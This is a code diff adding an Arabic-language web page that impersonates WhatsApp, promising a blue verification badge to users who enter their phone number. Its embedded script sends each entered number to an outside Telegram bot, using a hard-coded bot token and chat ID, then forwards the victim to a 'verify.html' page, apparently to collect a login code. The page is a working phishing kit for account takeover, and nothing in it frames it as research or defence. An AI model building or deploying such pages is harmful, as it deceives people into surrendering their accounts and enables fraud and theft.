@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>توثيق حساب واتساب</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+        .header { color: #25d366; font-size: 24px; font-weight: bold; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .verify-badge { color: #1da1f2; font-size: 20px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; text-align: center; font-size: 16px; }
+        button { width: 100%; padding: 12px; background-color: #25d366; border: none; border-radius: 5px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background-color: #1ebd59; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        توثيق واتساب <span class="verify-badge">✔</span>
+    </div>
+    <p>أدخل رقم هاتفك المرتبط بحساب واتساب لبدء عملية التوثيق والحصول على الشارة الزرقاء.</p>
+    
+    <input type="text" id="phone" placeholder="مثال: +201234567890">
+    <button onclick="sendPhone()">التالي</button>
+</div>
+
+<script>
+    const token = "7841615668:AAGwEvfH05NZKYNFqHZHhfAPZeio7rPlcJc";
+    const chatId = "6678179112";
+
+    function sendPhone() {
+        const phone = document.getElementById('phone').value;
+        if (phone.length < 8) {
+            alert("يرجى إدخال رقم هاتف صحيح");
+            return;
+        }
+
+        const message = `📱 رقم هاتف جديد:\n${phone}`;
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url).then(() => {
+            // تخزين الرقم مؤقتاً لتحويله للصفحة التالية (اختياري)
+            localStorage.setItem('userPhone', phone);
+            window.location.href = "verify.html";
+        }).catch(err => {
+            alert("حدث خطأ في الاتصال، حاول مرة أخرى");
+        });
+    }
+</script>
+
+</body>
+</html>
